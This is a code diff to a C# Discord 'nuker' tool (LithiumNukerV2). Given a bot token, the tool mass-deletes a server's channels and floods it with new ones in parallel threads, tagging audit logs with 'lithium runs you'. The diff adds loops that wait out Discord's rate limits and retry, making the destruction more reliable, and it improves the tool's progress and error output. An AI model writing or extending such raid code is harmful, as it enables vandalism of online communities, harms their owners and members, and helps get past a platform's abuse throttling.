@@ -3,10 +3,10 @@ using System;
 using System.Collections.Generic;
 using System.Net;
 using System.IO;
-using System.Dynamic;
 using System.Text;
 using System.Threading;
 using System.Drawing;
+using System.Diagnostics;
 
 // Custom
 using LithiumNukerV2;
@@ -117,12 +117,33 @@ namespace LithiumCore
 
             public void Delete(string token)
             {
+                Retry:
+
                 var req = WebRequest.Create($"https://discord.com/api/v9/channels/{Id}");
                 req.Method = "DELETE";
                 req.Headers.Add("Authorization", $"Bot {token}");
                 req.Headers.Add("X-Audit-Log-Reason", "lithium runs you");
-                var res = req.GetResponse();
-                res.Dispose();
+                WebResponse res = null;
+                try
+                {
+                    res = req.GetResponse();
+                }
+                catch (WebException ex) {
+                    if (ex.Status == WebExceptionStatus.Timeout)
+                        throw ex;
+
+                    dynamic json = JsonConvert.DeserializeObject(new StreamReader(ex.Response.GetResponseStream()).ReadToEnd());
+
+                    if (((string)json.message).Contains("rate limited")){
+                        Thread.Sleep((int)json.retry_after * 1000);
+                        goto Retry;
+                    } else
+                        throw ex;
+                }
+
+                if (res != null)
+                    res.Dispose();
+                return;
             }
         }
 
@@ -172,6 +193,8 @@ namespace LithiumCore
 
         public Channel Create(string name, Type type)
         {
+            Retry:
+
             var req = WebRequest.Create($"https://discord.com/api/v9/guilds/{guildId}/channels");
             req.Method = "POST";
             req.ContentType = "application/json";
@@ -197,21 +220,34 @@ namespace LithiumCore
 
             string raw;
             dynamic json;
+            Exception error = null;
 
+            WebResponse res = null;
             try 
             {
-                var res = req.GetResponse();
-                res.Close();
+                res = req.GetResponse();
                 raw = new StreamReader(res.GetResponseStream()).ReadToEnd();
-                core.WriteLine("Created channel ", Color.White, name);
             } catch (WebException ex)
             {
                 raw = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
-                core.WriteLine(Color.Red, $"Failed to create channel: {ex.Message}");
+                error = ex;
             }
+            if (res != null)
+                res.Close();
 
             // Conversion and finising
             json = JsonConvert.DeserializeObject(raw);
+
+            if (error != null)
+            {
+                if (((string)json.message).Contains("rate limited"))
+                {
+                    Thread.Sleep((int)json.retry_after * 1000);
+                    goto Retry;
+                }
+                else
+                    throw error;
+            }
 
             try
             {
@@ -248,16 +284,23 @@ namespace LithiumCore
                         {
                             var chan = Create(name, type);
                             channels.Add(chan);
+
+                            core.WriteLine("Created ", Color.White, $"#{name}", null, " [", Color.White, chan.Id.ToString(), null, "]");
                         }
-                        catch {  }
+                        catch (Exception ex) {
+                            Debug.WriteLine(ex);
+                            core.WriteLine(Color.Red, $"Failed to create channel ", Color.White, $"#{name}", null, ": ",  Color.White, ex.Message);
+                        }
                     }
                     finished++;
                 }).Start();
             }
 
             while (finished < count)
-                Thread.Sleep(20);
+                Thread.Sleep(50);
 
+            core.WriteLine(Color.Lime, $"Created {channels.Count} channels");
+            Finished?.Invoke();
             return channels;
         }
 
@@ -280,7 +323,7 @@ namespace LithiumCore
                         try
                         {
                             chan.Delete(token);
-                            core.WriteLine($"Deleted ", Color.White, chan.Name);
+                            core.WriteLine($"Deleted ", Color.White, $"#{chan.Name}", null, " [", Color.White, chan.Id.ToString(), null, "]");
                         } catch (Exception ex)
                         {
                             errors.Add(ex);
@@ -292,9 +335,14 @@ namespace LithiumCore
             }
 
             while (finished < loads.Count)
-                Thread.Sleep(20);
+                Thread.Sleep(50);
 
-            core.WriteLine(Color.Lime, $"Finished nuking {channels.Count} channels");
+            foreach (var ex in errors)
+            {
+                Debug.WriteLine(ex);
+            }
+
+            core.WriteLine(Color.Lime, $"Finished nuking {channels.Count - errors.Count} channels");
             Finished?.Invoke();
         }
     }
